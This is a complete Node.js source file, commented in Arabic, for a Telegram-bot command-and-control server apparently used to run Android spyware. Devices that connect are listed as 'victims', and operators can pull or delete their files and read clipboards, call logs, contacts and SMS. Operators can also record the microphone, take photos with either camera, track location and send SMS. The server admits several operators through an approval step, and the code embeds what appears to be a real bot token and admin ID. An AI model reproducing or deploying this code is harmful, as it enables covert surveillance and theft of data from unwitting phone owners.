const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- الإعدادات الأساسية للمطور @A_l_k_w_r_y ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const DEV_USER = "@A_l_k_w_r_y";

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let userConfigs = {}; // لتخزين رابط استضافة كل مستخدم { userId: "https://url..." }
let allowedUsers = [ADMIN_ID]; 

// --- لوحة التحكم ونظام تعدد الاستضافات ---
bot.on("message", (msg) => {
    const id = msg.chat.id;
    const text = msg.text;

    if (!allowedUsers.includes(id)) {
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب استخدام جديد!</b>\n🆔 المعرف: <code>${id}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "✅ تفعيل حسابه", callback_data: `allow_${id}` }]]
            }
        });
        return bot.sendMessage(id, "⏳ وصولك معلق.. بانتظار موافقة المطور.");
    }

    if (text === "/start") {
        const currentHost = userConfigs[id] || "لم يتم تعيين رابط بعد";
        const welcomeMsg = `💎 <b>أهلاً بك في نظام السيطرة المتعدد</b>\n\n` +
                           `🌐 <b>رابط استضافتك الحالي:</b>\n<code>${currentHost}</code>\n\n` +
                           `⚙️ لتغيير رابط الاستضافة، أرسل الرابط مباشرة للبوت.`;
        
        bot.sendMessage(id, welcomeMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [["📱 ضحاياي", "🔗 تعيين رابط جديد"], ["📊 الحالة العامة"]],
                resize_keyboard: true
            }
        });
    }

    // ميزة تعيين رابط استضافة خاص لكل مستخدم
    if (text && text.startsWith("http")) {
        userConfigs[id] = text;
        bot.sendMessage(id, `✅ تم اعتماد رابط استضافتك الخاص:\n<code>${text}</code>`, { parse_mode: 'HTML' });
    }

    if (text === "📱 ضحاياي") {
        const myVictims = clients.filter(c => c.ownerId == id);
        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا على استضافتك حالياً.");
        
        myVictims.forEach(c => {
            bot.sendMessage(id, `📍 جهاز: <code>${c.id}</code>`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🕹️ لوحة الاختراق", callback_data: `control_${c.id}` }]] }
            });
        });
    }
});

// --- معالجة أزرار التحكم (اللغة العربية الفصحى) ---
bot.on("callback_query", (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        allowedUsers.push(parseInt(value));
        bot.sendMessage(value, "✅ تم تفعيل حسابك بنجاح!");
    }

    if (action === "control") {
        const victimId = value;
        const controlButtons = {
            inline_keyboard: [
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
                [{ text: "📋 الحافظة", callback_data: `clip_${victimId}` }, { text: "🎙️ تسجيل صوتي", callback_data: `mic_${victimId}` }],
                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
                [{ text: "📍 الموقع", callback_data: `loc_${victimId}` }, { text: "💬 رسالة توست", callback_data: `toast_${victimId}` }],
                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 جهات الاتصال", callback_data: `contacts_${victimId}` }],
                [{ text: "📳 اهتزاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إرسال إشعار", callback_data: `notif_${victimId}` }],
                [{ text: "📩 سحب SMS", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال SMS", callback_data: `sendmsg_${victimId}` }],
                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }]
            ]
        };
        bot.sendMessage(q.message.chat.id, `🕹️ <b>التحكم بالجهاز:</b> <code>${victimId}</code>`, {
            parse_mode: 'HTML', reply_markup: controlButtons
        });
    }

    const target = clients.find(c => c.id === value);
    if (target && action !== "allow" && action !== "control") {
        target.ws.send(JSON.stringify({ cmd: action }));
        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ" });
    }
});

// --- نظام الربط الذكي ---
wss.on('connection', (ws, req) => {
    // استخراج ايدي صاحب الاستضافة من الرابط
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const ownerId = urlParams.get('id') || ADMIN_ID; 

    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });

    bot.sendMessage(ownerId, `⚠️ <b>تم سحب ضحية جديد على استضافتك! 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>`, { parse_mode: 'HTML' });
});

server.listen(process.env.PORT || 3000, () => { console.log("Multi-Host System Active"); });
